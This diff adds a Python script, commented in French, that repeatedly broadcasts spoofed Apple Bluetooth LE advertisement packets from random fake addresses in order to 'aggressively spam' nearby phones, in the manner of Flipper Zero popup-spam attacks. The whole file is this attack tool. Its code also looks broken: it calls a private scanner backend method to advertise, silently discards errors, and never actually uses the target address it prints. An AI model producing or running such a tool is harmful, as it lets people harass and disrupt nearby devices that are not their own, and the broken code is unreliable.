@@ -1,0 +1,54 @@
+import asyncio
+import random
+from bleak import BleakScanner
+
+# ===================== CONFIG =====================
+TARGET_MAC = "9CD7CBAA-95D2-68AA-7BF5-80E64B72E287"   # ← Remplace par l'adresse de ton téléphone
+DUREE = 60
+INTERVAL = 0.18                    # Plus rapide que avant
+
+# Paquets plus réalistes (issus de firmware Flipper & recherches publiques)
+PACKETS = [
+    bytes.fromhex("1eff4c000f0e000000000000000000000000000000000000000000"),
+    bytes.fromhex("1eff4c000f0e010000000000000000000000000000000000000000"),
+    bytes.fromhex("1eff4c000f0e0a0000000000000000000000000000000000000000"),
+    bytes.fromhex("1eff4c000f0e0c0a00000000000000000000000000000000000000"),
+    bytes.fromhex("1eff4c000f0e130000000000000000000000000000000000000000"),
+    bytes.fromhex("1eff4c000f0e140000000000000000000000000000000000000000"),
+    bytes.fromhex("1eff4c000f0e1e0000000000000000000000000000000000000000"),
+    bytes.fromhex("1eff4c000f0e0f0000000000000000000000000000000000000000"),
+    bytes.fromhex("1eff4c000f0e200000000000000000000000000000000000000000"),
+]
+
+async def main():
+    print(f"🎯 Cible : {TARGET_MAC}")
+    print("🚀 Spam très agressif lancé (Ctrl+C pour arrêter)\n")
+    
+    scanner = BleakScanner()
+    
+    try:
+        for i in range(DUREE * 5):   # On envoie très souvent
+            packet = random.choice(PACKETS)
+            fake_addr = f"00:11:22:{random.randint(0,255):02X}:{random.randint(0,255):02X}:{random.randint(0,255):02X}"
+            
+            try:
+                await scanner._backend.start_advertising(
+                    fake_addr,
+                    manufacturer_data={0x004C: packet},
+                    timeout=0.2
+                )
+                if i % 8 == 0:  # On affiche pas à chaque fois pour ne pas flood le terminal
+                    print(f"📡 Envoi ({i}) → Cible : {TARGET_MAC}")
+            except:
+                pass
+                
+            await asyncio.sleep(INTERVAL)
+            
+    except KeyboardInterrupt:
+        print("\n\nArrêt du test.")
+    except Exception as e:
+        print(f"Erreur: {e}")
+
+if __name__ == "__main__":
+    # Remplace la ligne TARGET_MAC en haut par celle de ton téléphone
+    asyncio.run(main())
